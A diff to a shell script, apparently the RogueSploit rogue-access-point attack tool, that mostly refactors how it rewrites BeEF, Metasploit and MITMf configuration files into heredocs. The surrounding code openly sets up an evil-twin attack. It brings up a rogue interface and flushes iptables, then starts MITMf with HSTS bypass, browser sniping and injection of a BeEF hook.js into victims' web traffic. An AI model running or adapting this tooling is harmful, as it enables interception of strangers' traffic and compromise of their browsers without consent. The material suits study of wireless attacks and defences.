@@ -125,6 +125,7 @@ autopwning2 () {
 #BeEF w/ Mitmf's js url injection
 beefinject () {
 	pkill dhcpd
+	pkill tor*
 	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
 	iptables -F
 	iptables -t nat -F
@@ -137,7 +138,8 @@ beefinject () {
 	sleep 0.6
 	echo -e $blue"["$yellow"*"$blue"]"$white" Changing configuration of BeEF! "$blue"["$yellow"*"$blue"]"
 	cp /usr/share/beef-xss/config.yaml /usr/share/beef-xss/config.yaml.reset
-	echo "#
+	cat << "EOF" > /usr/share/beef-xss/config.yaml
+#
 # Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
 # Browser Exploitation Framework (BeEF) - http://beefproject.com
 # See the file 'doc/COPYING' for copying permission
@@ -310,11 +312,13 @@ beef:
             enable: false
         # this is still experimental..
         dns_rebinding:
-            enable: false" > /usr/share/beef-xss/config.yaml
+            enable: false
+EOF
 	sleep 0.6
 	echo -e $blue"["$yellow"*"$blue"]"$white" Changing MSF's configuration for BeEF! "$blue"["$yellow"*"$blue"]"
 	cp /usr/share/beef-xss/extensions/metasploit/config.yaml /usr/share/beef-xss/extensions/metasploit/config.yaml.reset
-	echo "# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+	cat << "EOF" > /usr/share/beef-xss/extensions/metasploit/config.yaml
+# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
 # Browser Exploitation Framework (BeEF) - http://beefproject.com
 # See the file 'doc/COPYING' for copying permission
 #
@@ -355,11 +359,11 @@ beef:
               {os: 'win', path: 'c:\\metasploit-framework\\'},
               {os: 'custom', path: ''}
             ]
-" > /usr/share/beef-xss/extensions/metasploit/config.yaml
+EOF
 	sleep 0.6
 	echo -e $blue"["$yellow"*"$blue"]"$white" Changing MITMF's configuration for RogueSploit! "$blue"["$yellow"*"$blue"]"
 	cp /etc/mitmf/mitmf.conf /etc/mitmf/mitmf.conf.reset
-	echo "#
+	cat << "EOF" > /etc/mitmf/mitmf.conf
 # MITMf configuration file
 #
 
@@ -896,7 +900,7 @@ beef:
             authors: ["sussurro"]
             target:
                 working: ["ALL"]
-" > /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
+EOF
 	sleep 0.6
 	echo -e $blue"["$red"!"$blue"]"$white" Starting Roguesploit Pwning! "$blue"["$red"!"$blue"]"
 	rogueon & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e ./BeEFStarter & xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "mitmf -i wlan1 --hsts --browsersniper --inject --js-url http://10.0.0.1:3000/hook.js"
@@ -1203,7 +1207,6 @@ elif test $answer1 == '6'
 	read continuos
 	menu
 elif test $answer1 == '7'
-	elif test $answer1 == '7'
 	then
 	echo -ne $red"[!!] This update will delete everything in this directory, continue anyway? [y/N] "; tput sgr0
 	read cancel
